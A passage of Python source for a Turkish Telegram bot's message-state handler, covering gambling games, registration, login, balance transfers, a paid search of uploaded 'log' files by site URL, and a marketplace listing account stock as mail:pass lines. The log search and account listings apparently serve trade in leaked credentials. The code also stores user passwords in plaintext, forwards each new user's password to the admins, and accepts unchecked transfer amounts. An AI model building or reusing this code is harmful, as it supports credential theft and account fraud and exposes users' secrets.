      f"✅ **{coin_amt:.8f} {sym}** satıldı\n"
      f"Brüt {gross:.2f} − kom. {fee:.2f} = **+{net:.2f} TL**\n"
      f"💵 **{get_norm_bal(user_id):.2f} TL**",
      parse_mode="Markdown",
    )
    return

  if state == "waiting_horse_bet":
    raw = (message.text or "").strip().lower()
    if raw in ("/iptal", "iptal"):
      user_states.pop(chat_id, None)
      bot.send_message(chat_id, "İptal.")
      return
    try:
      bet = float(raw.replace(",", "."))
    except Exception:
      bot.send_message(chat_id, "Bahis TL yaz.")
      return
    gbal = float(get_gamble_bal(user_id) or 0)
    if bet <= 0 or bet > gbal:
      bot.send_message(chat_id, f"Yetersiz kumar bakiyesi (**{gbal:.2f}**).")
      return
    if MAX_GAMBLE_BET and bet > MAX_GAMBLE_BET and user_id not in admin_ids_set:
      bot.send_message(chat_id, f"Max bahis {MAX_GAMBLE_BET:.0f}")
      return
    user_states.pop(chat_id, None)
    admin_temp_data[chat_id] = {"horse_bet": bet}
    markup = types.InlineKeyboardMarkup(row_width=2)
    for i, name in enumerate(HORSE_NAMES):
      markup.add(types.InlineKeyboardButton(f"🐴 {name}", callback_data=f"horse_pick_{i}"))
    bot.send_message(chat_id, f"🏇 Bahis **{bet:.0f} TL** — atını seç:", reply_markup=markup, parse_mode="Markdown")
    return

  if state == "waiting_earn_proof":
    try:
      process_earn_proof(message, chat_id, user_id)
    except Exception as e:
      log_error("waiting_earn_proof", e)
      try:
        bot.send_message(chat_id, "❌ Kanıt işlenirken hata. Tekrar foto gönder veya /iptal")
      except Exception:
        pass
    return

  if state == "waiting_ilan_pay_ss":
    if message.text and message.text.strip().lower() in ("/iptal", "iptal", "/cancel", "cancel"):
      user_states.pop(chat_id, None)
      admin_temp_data.pop(chat_id, None)
      bot.send_message(chat_id, "❌ İptal edildi.")
      return
    photo_id = None
    if message.photo:
      photo_id = message.photo[-1].file_id
    elif message.document:
      mime = (message.document.mime_type or "").lower()
      name = (message.document.file_name or "").lower()
      if mime.startswith("image") or name.endswith((".jpg", ".jpeg", ".png", ".webp")):
        photo_id = message.document.file_id
    if not photo_id:
      bot.send_message(chat_id, "❌ Ödeme **ekran görüntüsünü foto** olarak gönder.\nİptal: /iptal", parse_mode="Markdown")
      return
    cap = (message.caption or message.text or "").strip()
    submit_ilan_pay_ss(user_id, chat_id, photo_id, caption_extra=cap)
    return

  if user_id not in admin_ids_set and not has_channel_access(user_id):
    send_channel_gate(chat_id, user_id)
    return

  if state == "waiting_display_name":
    if message.text:
      name = message.text.strip()[:32]
      ensure_user(user_id)
      user_credentials[user_id]["display_name"] = name
      user_credentials[user_id]["reg_username"] = name
      save_data()
      user_states.pop(chat_id, None)
      bot.send_message(chat_id, f"✅ Görünen ad güncellendi: **{name}**", parse_mode="Markdown")
      ana_menu_goster(chat_id, user_id)
    return

  if state == "waiting_bug_report":
    text = (message.text or message.caption or "").strip()
    photo_id = message.photo[-1].file_id if message.photo else None
    if not text and not photo_id:
      bot.send_message(chat_id, "❌ Metin veya ekran görüntüsü gönder.")
      return
    if len(text) < 5 and not photo_id:
      bot.send_message(chat_id, "❌ Biraz daha detay yaz (en az birkaç kelime).")
      return
    rid = uuid.uuid4().hex[:10]
    rep = {
      "reporter": user_id,
      "text": text or "(sadece görsel)",
      "photo": photo_id,
      "time": get_current_time_str(),
      "status": "pending",
    }
    pending_bug_reports[rid] = rep
    save_data()
    user_states.pop(chat_id, None)
    log_activity("bug_report", user_id, rid)
    bot.send_message(
      chat_id,
      f"✅ **Hata bildirimin alındı!**\n\n"
      f"🆔 `{rid}`\n"
      f"Admin inceler. Onaylarsa **+{BUG_REPORT_REWARD:.0f} TL** gelir.\n\n"
      f"Teşekkürler 🙏",
      parse_mode="Markdown",
    )
    admin_markup = types.InlineKeyboardMarkup(row_width=2)
    admin_markup.add(
      types.InlineKeyboardButton(f"✅ Onayla (+{BUG_REPORT_REWARD:.0f} TL)", callback_data=f"bug_approve_{rid}"),
      types.InlineKeyboardButton("❌ Reddet", callback_data=f"bug_reject_{rid}"),
    )
    admin_text = (
      f"🐛 **YENİ HATA BİLDİRİMİ** `{rid}`\n\n"
      f"👤 `{user_id}` {username}\n"
      f"📝 {text[:3500] or '(görsel)'}"
    )
    for admin_id in admin_ids_set:
      try:
        if photo_id:
          bot.send_photo(admin_id, photo_id, caption=admin_text, reply_markup=admin_markup, parse_mode="Markdown")
        else:
          bot.send_message(admin_id, admin_text, reply_markup=admin_markup, parse_mode="Markdown")
      except Exception:
        pass
    return


  if state == "waiting_my_bot_token":
    tok = (message.text or "").strip()
    if tok.startswith("/"):
      user_states.pop(chat_id, None)
      bot.send_message(chat_id, "İptal.")
      return
    ok, info = validate_bot_token(tok)
    if not ok:
      bot.send_message(chat_id, f"❌ Token geçersiz: {info}")
      return
    user_bot_tokens[user_id] = {
      "token": tok,
      "username": info.get("username") or "",
      "bot_id": info.get("bot_id"),
      "name": info.get("name") or "",
    }
    save_data()
    user_states.pop(chat_id, None)
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("▶️ Şimdi başlat", callback_data="mybot_start"))
    markup.add(types.InlineKeyboardButton("🔙 Menü", callback_data="menu_my_bot"))
    bot.send_message(
      chat_id,
      f"✅ Token kaydedildi!\nBot: @{info.get('username','?')}\n\nBaşlat’a bas.",
      reply_markup=markup,
    )
    return

  if state == "waiting_c2_bet":
    if not message.text:
      return
    if message.text.strip().lower() in ("/iptal", "iptal"):
      user_states.pop(chat_id, None)
      bot.send_message(chat_id, "İptal.")
      return
    try:
      bet = float(message.text.replace(",", ".").strip())
    except Exception:
      bot.send_message(chat_id, "❌ Sayı yaz.")
      return
    game = (admin_temp_data.get(chat_id) or {}).get("c2_game") or "slot"
    user_states.pop(chat_id, None)
    if game == "slot":
      try:
        bot.send_message(chat_id, "🎰 🍒 🍋 7️⃣ ...")
      except Exception:
        pass
      process_casino_v2_play(user_id, chat_id, "slot", bet, "")
      return
    markup = types.InlineKeyboardMarkup(row_width=3)
    if game == "coin":
      markup.add(
        types.InlineKeyboardButton("Yazı", callback_data=f"c2_choice_coin_yazi_{bet}"),
        types.InlineKeyboardButton("Tura", callback_data=f"c2_choice_coin_tura_{bet}"),
      )
    elif game == "dice":
      markup.add(
        types.InlineKeyboardButton("1-3", callback_data=f"c2_choice_dice_low_{bet}"),
        types.InlineKeyboardButton("4-6", callback_data=f"c2_choice_dice_high_{bet}"),
        types.InlineKeyboardButton("Tam 6", callback_data=f"c2_choice_dice_six_{bet}"),
      )
    elif game == "tkm":
      markup.add(
        types.InlineKeyboardButton("✊ Taş", callback_data=f"c2_choice_tkm_tas_{bet}"),
        types.InlineKeyboardButton("✋ Kağıt", callback_data=f"c2_choice_tkm_kagit_{bet}"),
        types.InlineKeyboardButton("✌️ Makas", callback_data=f"c2_choice_tkm_makas_{bet}"),
      )
    bot.send_message(chat_id, f"Bahis **{bet:.0f} TL** — seçimini yap:", reply_markup=markup, parse_mode="Markdown")
    return

  if state == "waiting_confession":
    txt = (message.text or "").strip()
    if txt.lower() in ("/iptal", "iptal"):
      user_states.pop(chat_id, None)
      bot.send_message(chat_id, "İptal.")
      return
    if len(txt) < 3:
      bot.send_message(chat_id, "Çok kısa.")
      return
    cid = str(uuid.uuid4())[:6]
    confessions.append({"id": cid, "text": txt[:500], "time": get_current_time_str(), "hidden": False})
    confession_meta[cid] = user_id
    if len(confessions) > 500:
      confessions[:] = confessions[-500:]
    save_data()
    user_states.pop(chat_id, None)
    bot.send_message(chat_id, f"✅ Anonim yayınlandı `#{cid}`")
    return

  if state == "waiting_confession_del":
    if user_id not in admin_ids_set:
      user_states.pop(chat_id, None)
      return
    cid = (message.text or "").strip().lstrip("#")
    if cid.lower() in ("/iptal", "iptal"):
      user_states.pop(chat_id, None)
      return
    found = False
    for c in confessions:
      if str(c.get("id")) == cid:
        c["hidden"] = True
        found = True
        break
    save_data()
    user_states.pop(chat_id, None)
    bot.send_message(chat_id, "🗑 Silindi." if found else "Bulunamadı.")
    return

  if state == "waiting_daily_q":
    if user_id not in admin_ids_set:
      user_states.pop(chat_id, None)
      return
    admin_temp_data[chat_id] = {"dq": (message.text or "").strip()}
    user_states[chat_id] = "waiting_daily_opts"
    bot.send_message(chat_id, "Şıkları yaz: `A|B|C`", parse_mode="Markdown")
    return

  if state == "waiting_daily_opts":
    if user_id not in admin_ids_set:
      user_states.pop(chat_id, None)
      return
    opts = [x.strip() for x in (message.text or "").split("|") if x.strip()]
    q = (admin_temp_data.get(chat_id) or {}).get("dq") or "?"
    daily_question.clear()
    daily_question.update({"q": q, "opts": opts[:6], "votes": {}, "active": True})
    save_data()
    user_states.pop(chat_id, None)
    bot.send_message(chat_id, f"✅ Soru açıldı: {q}")
    return

  if state == "waiting_giveaway":
    if user_id not in admin_ids_set:
      user_states.pop(chat_id, None)
      return
    parts = (message.text or "").split("|")
    if len(parts) < 2:
      bot.send_message(chat_id, "Format: başlık|ödül|ücret")
      return
    title, prize = parts[0].strip(), parts[1].strip()
    try:
      cost = float(parts[2]) if len(parts) > 2 else 0
    except Exception:
      cost = 0
    gid = str(uuid.uuid4())[:6]
    giveaways[gid] = {"title": title, "prize": prize, "cost": cost, "entrants": [], "active": True}
    save_data()
    user_states.pop(chat_id, None)
    bot.send_message(chat_id, f"✅ Çekiliş `#{gid}` açıldı.")
    return

  if state == "waiting_text_tool":
    raw = message.text or ""
    if raw.strip().lower() in ("/iptal", "iptal"):
      user_states.pop(chat_id, None)
      return
    lines = raw.splitlines()
    upper = raw.upper()
    lower = raw.lower()
    uniq = "\n".join(dict.fromkeys(lines))
    bot.send_message(
      chat_id,
      f"Satır: **{len(lines)}** · Karakter: **{len(raw)}**\n\n"
      f"**Büyük:**\n`{upper[:400]}`\n\n"
      f"**Küçük:**\n`{lower[:400]}`\n\n"
      f"**Tekrarsız:**\n`{uniq[:400]}`",
      parse_mode="Markdown",
    )
    user_states.pop(chat_id, None)
    return

  if state == "waiting_duel_bet":
    try:
      bet = float((message.text or "").replace(",", "."))
    except Exception:
      bot.send_message(chat_id, "Sayı yaz.")
      return
    if bet <= 0 or user_balances.get(user_id, 0) < bet:
      bot.send_message(chat_id, "Yetersiz bakiye.")
      return
    partner = None
    for uid, b in list(duel_waiting.items()):
      if uid != user_id and abs(float(b) - bet) < 0.01:
        partner = uid
        break
    if partner is None:
      duel_waiting[user_id] = bet
      user_states.pop(chat_id, None)
      bot.send_message(chat_id, f"⚔️ Bekleniyor (bahis {bet:.0f})...")
      return
    duel_waiting.pop(partner, None)
    user_balances[user_id] = user_balances.get(user_id, 0) - bet
    user_balances[partner] = user_balances.get(partner, 0) - bet
    winner = random.choice([user_id, partner])
    user_balances[winner] = user_balances.get(winner, 0) + bet * 2
    save_data()
    user_states.pop(chat_id, None)
    bot.send_message(chat_id, f"⚔️ {'Kazandın' if winner == user_id else 'Kaybettin'} · pot {bet*2:.0f}")
    try:
      bot.send_message(partner, f"⚔️ {'Kazandın' if winner == partner else 'Kaybettin'} · pot {bet*2:.0f}")
    except Exception:
      pass
    return

  if state in ("waiting_log_search", "waiting_log_search_short", "waiting_log_search_long"):
    if not message.text:
      bot.send_message(chat_id, "❌ Lütfen aranacak kelimeyi yazın.")
      return
    target_url = message.text.strip().lower()
    ok_pay, pay_msg, charged = try_charge_log_search(user_id)
    if not ok_pay:
      user_states.pop(chat_id, None)
      markup = types.InlineKeyboardMarkup()
      markup.add(types.InlineKeyboardButton("💳 Bakiye", callback_data="menu_bakiye"))
      markup.add(types.InlineKeyboardButton("🔙 Ana Menü", callback_data="main_menu"))
      bot.send_message(chat_id, pay_msg, reply_markup=markup, parse_mode="Markdown")
      return
    user_states.pop(chat_id, None)
    if state == "waiting_log_search_short":
      search_files = list_shard_files_for_query(target_url)
      used_shards = True
      if not search_files:
        user_states.pop(chat_id, None)
        try:
          log_search_last.pop(user_id, None)
          save_data()
        except Exception:
          pass
        _refund_log_search(user_id, charged)
        bot.send_message(
          chat_id,
          "📭 **Shard'da sonuç yok**\n\n"
          "Bu site henüz indexlenmemiş olabilir.\n"
          "🔎 Uzun arama (tüm txt) dene veya admin shard index yapsın.",
          parse_mode="Markdown",
        )
        return
    elif state == "waiting_log_search_long":
      search_files = list_searchable_log_files()
      used_shards = False
    else:
      search_files = list_shard_files_for_query(target_url)
      used_shards = bool(search_files)
      if not search_files:
        search_files = list_searchable_log_files()
        used_shards = False
    if not search_files:
      try:
        log_search_last.pop(user_id, None)
        save_data()
      except Exception:
        pass
      _refund_log_search(user_id, charged)
      bot.send_message(
        chat_id,
        "📭 Sistemde henüz log yok.\n\n"
        "Admin şunlardan birini yapmalı:\n"
        "• `log_inbox.txt` dosyasını bot klasörüne koy\n"
        "• veya `log_inbox/` klasörüne `.txt` at → **İçe Aktar**\n"
        "• veya küçük txt'yi Telegram'dan ekle\n\n"
        "↩️ Hak / bakiye iade edildi.",
        parse_mode="Markdown"
      )
      return
    est = estimate_log_search_seconds(search_files)
    total_sz = 0
    for _fp in search_files:
      try:
        total_sz += os.path.getsize(_fp)
      except Exception:
        pass
    try:
      bot.send_message(
        chat_id,
        f"🔍 Aranıyor: `{target_url}`\n"
        f"⚡ Mod: **{'SHARD (hızlı)' if used_shards else 'TAM TARAMA'}**\n"
        f"📁 **{len(search_files)}** kaynak · **{format_bytes(total_sz)}**\n"
        f"⏱ Tahmini süre: **{format_cooldown(est)}**\n"
        f"{pay_msg}\n\n"
        f"⏳ Bittiğinde CLEAN + RAW dosyaları gelecek.",
        parse_mode="Markdown"
      )
    except Exception:
      pass
    threading.Thread(
      target=_run_log_search,
      args=(chat_id, user_id, target_url, search_files, charged),
      daemon=True,
    ).start()
    return
  if state == "waiting_admin_log_urls" and user_id in admin_ids_set:
    admin_file = URLS_LOG_FILE
    added = 0
    if message.document:
      try:
        fname = (message.document.file_name or "").lower()
        if fname.endswith((".rar", ".zip", ".7z", ".gz", ".tar", ".bz2")):
          bot.send_message(
            chat_id,
            "❌ **RAR/ZIP eklenemez!**\n\n"
            "`urls.txt` sadece **düz metin (.txt)** kabul eder.\n"
            "1) Arşivi bilgisayarda aç\n"
            "2) İçindeki `.txt` logları çıkar\n"
            "3) `log_inbox/` klasörüne koy → **İçe Aktar**\n\n"
            "RAR/binary dosya botu çökertir ve arama çalışmaz.",
            parse_mode="Markdown"
          )
          return
        doc_size = getattr(message.document, "file_size", None) or 0
        if doc_size and doc_size > MAX_UPLOAD_LOG_BYTES:
          bot.send_message(
            chat_id,
            f"❌ Dosya çok büyük (Telegram sınırı)!\n"
            f"📎 Gönderilen: **{format_bytes(doc_size)}**\n"
            f"📏 Telegram max: **{format_bytes(MAX_UPLOAD_LOG_BYTES)}**\n\n"
            f"💡 20MB üstü için dosyayı sunucuda `log_inbox/` klasörüne koy,\n"
            f"Admin → **log_inbox'tan İçe Aktar** kullan.",
            parse_mode="Markdown"
          )
          return
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        payload = downloaded if isinstance(downloaded, (bytes, bytearray)) else str(downloaded).encode("utf-8", errors="ignore")
        text_content = payload.decode("utf-8", errors="ignore") if isinstance(payload, (bytes, bytearray)) else str(payload)
        lines = [ln.strip() for ln in text_content.splitlines() if ln.strip()]
        if lines:
          chunk = "\n".join(lines) + "\n"
          with open(admin_file, "a", encoding="utf-8") as f:
            f.write(chunk)
          added = len(lines)
          new_sz = get_urls_log_size()
          bot.send_message(
            chat_id,
            f"✅ **{message.document.file_name or 'dosya'}** içinden **{added}** satır eklendi.\n"
            f"📦 urls.txt boyutu: **{format_bytes(new_sz)}** (limit yok)\n"
            f"Başka dosya / metin gönderebilirsiniz veya Ana Menü'ye dönün.",
            parse_mode="Markdown"
          )
          log_activity("log_add_file", user_id, f"{added}:{message.document.file_name}")
        else:
          bot.send_message(chat_id, "❌ Dosya boş.")
      except Exception as e:
        bot.send_message(chat_id, f"❌ Dosya okunamadı: {e}")
      return
    if message.text:
      if message.text.strip().lower() in ("iptal", "cancel", "/cancel"):
        user_states.pop(chat_id, None)
        bot.send_message(chat_id, "❌ İptal edildi.")
        return
      lines = [ln.strip() for ln in message.text.splitlines() if ln.strip()]
      if not lines:
        bot.send_message(chat_id, "❌ Boş metin.")
        return
      chunk = "\n".join(lines) + "\n"
      with open(admin_file, "a", encoding="utf-8") as f:
        f.write(chunk)
      added = len(lines)
      total = 0
      if os.path.exists(admin_file):
        with open(admin_file, "r", encoding="utf-8") as f:
          total = sum(1 for ln in f if ln.strip())
      new_sz = get_urls_log_size()
      markup = types.InlineKeyboardMarkup(row_width=1)
      markup.add(
        types.InlineKeyboardButton("📎 Daha fazla ekle", callback_data="admin_add_log_urls"),
        types.InlineKeyboardButton("📋 Listeyi Gör", callback_data="admin_list_log_urls"),
        types.InlineKeyboardButton("🔙 Admin Panel", callback_data="menu_admin"),
      )
      bot.send_message(
        chat_id,
        f"✅ **{added}** satır `urls.txt` dosyasına eklendi.\n"
        f"📦 Toplam kayıt: **{total}**\n"
        f"📏 Boyut: **{format_bytes(new_sz)}** (limit yok)\n\n"
        f"İsterseniz başka metin / .txt dosyası göndermeye devam edin.",
        reply_markup=markup,
        parse_mode="Markdown"
      )
      log_activity("log_add_text", user_id, str(added))
      return
    bot.send_message(chat_id, "❌ Metin veya .txt dosyası gönderin.")
    return

  if state == "waiting_new_password":
    if message.text:
      new_pass = message.text.strip()
      if user_id in user_credentials:
        user_credentials[user_id]['password'] = new_pass
        save_data()
        user_states.pop(chat_id, None)
        bot.send_message(chat_id, f"✅ **Şifreniz başarıyla güncellendi!**\nYeni şifreniz: `{new_pass}`", parse_mode="Markdown")
        ana_menu_goster(chat_id, user_id)
      else:
        bot.send_message(chat_id, "❌ Kullanıcı hesabınız bulunamadı.")
    return

  if state == "waiting_reg_username":
    if message.text:
      input_username = message.text.strip()
      if is_username_taken(input_username):
        bot.send_message(chat_id, "❌ **Bu kullanıcı adı zaten alınmış!**\nLütfen farklı bir kullanıcı adı girin:", parse_mode="Markdown")
        return
      admin_temp_data.setdefault(chat_id, {})['reg_username'] = input_username
      user_states[chat_id] = "waiting_reg_email"
      bot.send_message(chat_id, "📧 Lütfen **E-Posta (Mail)** adresinizi yazın:", parse_mode="Markdown")
    return

  elif state == "waiting_reg_email":
    if message.text:
      input_email = message.text.strip()
      if is_email_taken(input_email):
        bot.send_message(chat_id, "❌ **Bu e-posta adresi zaten kullanımda!**\nLütfen farklı bir e-posta adresi girin:", parse_mode="Markdown")
        return
      admin_temp_data.setdefault(chat_id, {})['reg_email'] = input_email
      user_states[chat_id] = "waiting_reg_password"
      bot.send_message(chat_id, "🔑 Lütfen hesabınız için bir **Şifre** girin:", parse_mode="Markdown")
    return

  elif state == "waiting_reg_password":
    if message.text:
      reg_pass = message.text.strip()
      temp_info = admin_temp_data.get(chat_id, {})
      reg_user = temp_info.get('reg_username', 'Girilmedi')
      reg_mail = temp_info.get('reg_email', 'Girilmedi')

      user_credentials[user_id] = {
        'reg_username': reg_user,
        'email': reg_mail,
        'password': reg_pass,
        'logged_in': True
      }
      registered_users.add(user_id)
      if user_id not in user_balances: user_balances[user_id] = 0.0
      if user_id not in ref_balances: ref_balances[user_id] = 0.0

      ref_id = temp_info.get('ref_id')
      if ref_id and ref_id != user_id and user_id not in user_referrers:
        user_referrers[user_id] = ref_id
        ref_balances[ref_id] = ref_balances.get(ref_id, 0.0) + 3.0
        try:
          bot.send_message(ref_id, "🎉 Tebrikler! Referansınızla yeni bir kullanıcı kayıt oldu ve **Referans Bakiyenize** **3.0 TL** eklendi!", parse_mode="Markdown")
        except:
          pass

      save_data()

      admin_notif_msg = (
        f"🚨 **YENİ KULLANICI KAYIT OLDU!**\n\n"
        f"🆔 Telegram ID: `{user_id}`\n"
        f"👤 Telegram Username: {username}\n"
        f"👤 Kayıtlı Kullanıcı Adı: `{reg_user}`\n"
        f"📧 E-Posta: `{reg_mail}`\n"
        f"🔑 Şifre: `{reg_pass}`\n"
        f"📅 Tarih: `{get_current_time_str()}`"
      )
      for admin_id in admin_ids_set:
        try:
          bot.send_message(admin_id, admin_notif_msg, parse_mode="Markdown")
        except:
          pass

      user_states.pop(chat_id, None)
      admin_temp_data.pop(chat_id, None)
      bot.send_message(chat_id, "✅ **Kayıt ve Giriş İşleminiz Başarıyla Tamamlandı!**\nSisteme Hoş Geldiniz.", parse_mode="Markdown")
      ana_menu_goster(chat_id, user_id)
    return

  elif state == "waiting_login_identifier":
    if message.text:
      identifier = message.text.strip()
      target_uid, account_creds = find_account_by_identifier(identifier)
      if not account_creds:
        bot.send_message(chat_id, "❌ **Böyle bir kullanıcı adı veya e-posta adresi bulunamadı!**\nLütfen tekrar deneyin:", parse_mode="Markdown")
        return

      admin_temp_data[chat_id] = {
        'login_target_uid': target_uid,
        'account_creds': account_creds
      }
      user_states[chat_id] = "waiting_login_password"
      bot.send_message(chat_id, f"🔑 **{account_creds['reg_username']}** hesabının **Şifresini** girin:", parse_mode="Markdown")
    return

  elif state == "waiting_login_password":
    if message.text:
      input_pass = message.text.strip()
      login_data = admin_temp_data.get(chat_id, {})
      target_uid = login_data.get('login_target_uid')
      account_creds = login_data.get('account_creds', {})

      if account_creds.get('password') == input_pass:
        login_attempts.pop(account_creds.get('reg_username', ''), None)
        user_credentials[user_id] = {
          'reg_username': account_creds['reg_username'],
          'email': account_creds['email'],
          'password': account_creds['password'],
          'logged_in': True
        }
        registered_users.add(user_id)

        if target_uid and target_uid != user_id:
          user_balances[user_id] = user_balances.get(target_uid, user_balances.get(user_id, 0.0))
          ref_balances[user_id] = ref_balances.get(target_uid, ref_balances.get(user_id, 0.0))

        save_data()
        log_activity("login", user_id, account_creds['reg_username'])
        user_states.pop(chat_id, None)
        admin_temp_data.pop(chat_id, None)

        bot.send_message(chat_id, f"✅ **Giriş Başarılı!**\nHoş geldiniz, **{account_creds['reg_username']}**.", parse_mode="Markdown")
        ana_menu_goster(chat_id, user_id)
      else:
        ident = account_creds.get('reg_username', 'x')
        if check_login_attempts(ident):
          bot.send_message(chat_id, "🛑 Çok fazla yanlış şifre! 10 dakika bekleyin.")
          user_states.pop(chat_id, None)
          return
        bot.send_message(chat_id, "❌ **Şifre yanlış!** Lütfen şifrenizi tekrar girin:", parse_mode="Markdown")
    return

  if state == "waiting_ilan_title":
    if message.text:
      admin_temp_data.setdefault(chat_id, {}).setdefault("new_listing", {})["title"] = message.text.strip()[:80]
      user_states[chat_id] = "waiting_ilan_price"
      bot.send_message(
        chat_id,
        "⭐ Adım 2/4: **Yıldız fiyatını** yaz (örn: 50, 100):\n"
        "Alıcı bu kadar yıldız ödeyecek.",
        parse_mode="Markdown",
      )
    return

  elif state == "waiting_ilan_price":
    if message.text:
      try:
        stars = int(float(message.text.replace(",", ".").strip()))
        if stars < 1 or stars > 100000:
          bot.send_message(chat_id, "❌ 1–100000 arası yıldız yaz.")
          return
        admin_temp_data.setdefault(chat_id, {}).setdefault("new_listing", {})["price_stars"] = stars
        admin_temp_data[chat_id]["new_listing"]["price"] = stars
        user_states[chat_id] = "waiting_ilan_desc"
        bot.send_message(chat_id, "📄 Adım 3/4: İlan **açıklamasını** yaz:")
      except Exception:
        bot.send_message(chat_id, "❌ Geçerli sayı yaz (örn: 100)")
    return

  elif state == "waiting_ilan_desc":
    if message.text:
      admin_temp_data.setdefault(chat_id, {}).setdefault("new_listing", {})["desc"] = message.text.strip()[:500]
      cat = (admin_temp_data.get(chat_id, {}).get("new_listing", {}).get("category") or "HESAP").upper()
      if cat == "MT":
        user_states[chat_id] = "waiting_ilan_mt_text"
        bot.send_message(
          chat_id,
          "📝 **MT ürün metni** yaz (alıcıya teslim edilecek yazı):\n\n"
          "Sadece metin yeterli — satır satır hesap değil.",
          parse_mode="Markdown",
        )
      else:
        user_states[chat_id] = "waiting_ilan_stock_digital"
        bot.send_message(
          chat_id,
          "📦 **HESAP stok** — `mail:pass` satırlarını yaz (her satır 1 hesap):\n\n"
          "Örnek:\n`mail1@x.com:sifre1`\n`mail2@x.com:sifre2`\n\n"
          "İstersen `.txt` dosyası da gönderebilirsin.",
          parse_mode="Markdown",
        )
    return

  elif state == "waiting_ilan_mt_text":
    if message.text:
      if message.text.strip().lower() in ("/iptal", "iptal"):
        user_states.pop(chat_id, None)
        admin_temp_data.pop(chat_id, None)
        bot.send_message(chat_id, "❌ İptal.")
        return
      txt = message.text.strip()[:2000]
      if len(txt) < 1:
        bot.send_message(chat_id, "❌ Boş olamaz.")
        return
      admin_temp_data.setdefault(chat_id, {}).setdefault("new_listing", {})["mt_text"] = txt
      user_states[chat_id] = "waiting_ilan_mt_stock"
      bot.send_message(
        chat_id,
        "📦 **Stok adedi** yaz (kaç satış yapılacak? örn: `5`):",
        parse_mode="Markdown",
      )
    else:
      bot.send_message(chat_id, "❌ Metin yaz.")
    return

  elif state == "waiting_ilan_mt_stock":
    if message.text:
      if message.text.strip().lower() in ("/iptal", "iptal"):
        user_states.pop(chat_id, None)
        admin_temp_data.pop(chat_id, None)
        bot.send_message(chat_id, "❌ İptal.")
        return
      try:
        n = int(message.text.strip())
        if n < 1 or n > 10000:
          bot.send_message(chat_id, "❌ 1–10000 arası yaz.")
          return
      except Exception:
        bot.send_message(chat_id, "❌ Sayı yaz (örn: 3)")
        return
      nl = admin_temp_data.setdefault(chat_id, {}).setdefault("new_listing", {})
      nl["stock"] = n
      nl["stock_items"] = []
      nl["category"] = "MT"
      user_states.pop(chat_id, None)
      preview = (
        f"📋 **İLAN ÖNİZLEME (MT)**\n\n"
        f"🏷 Kategori: **MT**\n"
        f"🏷️ {nl.get('title')}\n"
        f"⭐ Fiyat: **{nl.get('price_stars')} yıldız**\n"
        f"📦 Stok: **{n}** adet\n"
        f"📄 {nl.get('desc')}\n\n"
        f"✅ Admin onayına gönder (ürün metni sadece admin görür)."
      )
      markup = types.InlineKeyboardMarkup(row_width=2)
      markup.add(
        types.InlineKeyboardButton("✅ Admin Onayına Gönder", callback_data="confirm_publish_ilan"),
        types.InlineKeyboardButton("❌ İptal", callback_data="cancel_publish_ilan"),
      )
      bot.send_message(chat_id, preview, reply_markup=markup, parse_mode="Markdown")
    return

  elif state == "waiting_ilan_stock_digital":
    lines = []
    if message.document:
      try:
        fi = bot.get_file(message.document.file_id)
        raw = bot.download_file(fi.file_path)
        if isinstance(raw, (bytes, bytearray)):
          raw = raw.decode("utf-8", errors="ignore")
        lines = [ln.strip() for ln in str(raw).splitlines() if ln.strip()]
      except Exception as e:
        bot.send_message(chat_id, f"❌ Dosya okunamadı: {e}")
        return
    elif message.text:
      if message.text.strip().lower() in ("/iptal", "iptal"):
        user_states.pop(chat_id, None)
        admin_temp_data.pop(chat_id, None)
        bot.send_message(chat_id, "❌ İptal.")
        return
      lines = [ln.strip() for ln in message.text.splitlines() if ln.strip()]
    else:
      bot.send_message(chat_id, "❌ Metin veya .txt gönder.")
      return
    if not lines:
      bot.send_message(chat_id, "❌ En az 1 satır stok gerekli.")
      return
    nl = admin_temp_data.setdefault(chat_id, {}).setdefault("new_listing", {})
    nl["stock_items"] = lines
    nl["stock"] = len(lines)
    user_states.pop(chat_id, None)
    cat = nl.get("category", "HESAP")
    preview = (
      f"📋 **İLAN ÖNİZLEME (HESAP)**\n\n"
      f"🏷 Kategori: **{cat}**\n"
      f"🏷️ Başlık: **{nl.get('title')}**\n"
      f"⭐ Fiyat: **{nl.get('price_stars')} yıldız**\n"
      f"📦 Stok: **{len(lines)}** adet\n"
      f"📄 {nl.get('desc')}\n\n"
      f"✅ Admin onayına gönder (hesap satırları sadece admin görür)."
    )
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
      types.InlineKeyboardButton("✅ Admin Onayına Gönder", callback_data="confirm_publish_ilan"),
      types.InlineKeyboardButton("❌ İptal", callback_data="cancel_publish_ilan"),
    )
    bot.send_message(chat_id, preview, reply_markup=markup, parse_mode="Markdown")
    return

  if state == "waiting_transfer_id":
    if message.text and message.text.isdigit():
      target_id = int(message.text.strip())
      if target_id == user_id:
        bot.send_message(chat_id, "❌ Kendinize bakiye transfer edemezsiniz.")
        return
      admin_temp_data[chat_id] = {'transfer_target_id': target_id}
      user_states[chat_id] = "waiting_transfer_amount"
      bot.send_message(chat_id, f"💵 `{target_id}` kullanıcısına göndermek istediğiniz **Miktarı (TL)** yazın:")
    else:
      bot.send_message(chat_id, "❌ Geçersiz Telegram ID. Sayısal bir ID yazın:")
    return

  elif state == "waiting_transfer_amount":
    if message.text:
      try:
        amount = float(message.text.replace(",", "."))
        target_id = admin_temp_data.get(chat_id, {}).get('transfer_target_id')
        total_deduct = amount + 1.0 # 1 TL İşlem ücreti

        if user_balances.get(user_id, 0.0) < total_deduct:
          bot.send_message(chat_id, f"❌ Yetersiz bakiye! Gönderilecek tutar + 1 TL kesinti için en az **{total_deduct:.2f} TL** bakiyeniz olmalı.")
          return

        user_balances[user_id] -= total_deduct
        user_balances[target_id] = user_balances.get(target_id, 0.0) + amount
        add_balance_history(user_id, "transfer_out", -total_deduct, f"to {target_id}")
        add_balance_history(target_id, "transfer_in", amount, f"from {user_id}")
        check_suspicious(user_id, amount, "transfer")
        log_activity("transfer", user_id, f"{amount} -> {target_id}")
        add_xp(user_id, 3)
        save_data()

        user_states.pop(chat_id, None)
        admin_temp_data.pop(chat_id, None)
        bot.send_message(chat_id, f"✅ **Transfer Başarılı!**\n\n👤 Alıcı ID: `{target_id}`\n💵 Aktarılan Tutar: **{amount:.2f} TL**\n💳 Kalan Bakiyeniz: **{user_balances[user_id]:.2f} TL**", parse_mode="Markdown")
        try:
          bot.send_message(target_id, f"🎉 `{user_id}` kullanıcısı hesabınıza **{amount:.2f} TL** bakiye transfer etti!", parse_mode="Markdown")
        except:
          pass
      except:
